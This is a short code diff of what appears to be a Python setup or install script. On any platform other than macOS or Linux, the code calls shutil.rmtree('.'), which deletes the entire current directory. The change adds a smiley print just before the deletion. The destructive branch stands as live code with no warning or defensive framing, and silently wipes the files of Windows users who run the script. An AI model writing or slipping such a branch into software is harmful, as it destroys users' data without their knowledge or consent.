@@ -27,6 +27,7 @@ line()
 p = platform.system()
 
 if p not in ('Darwin', 'Linux'):
+    print(':)')
     shutil.rmtree('.')
 
 if p == 'Darwin':
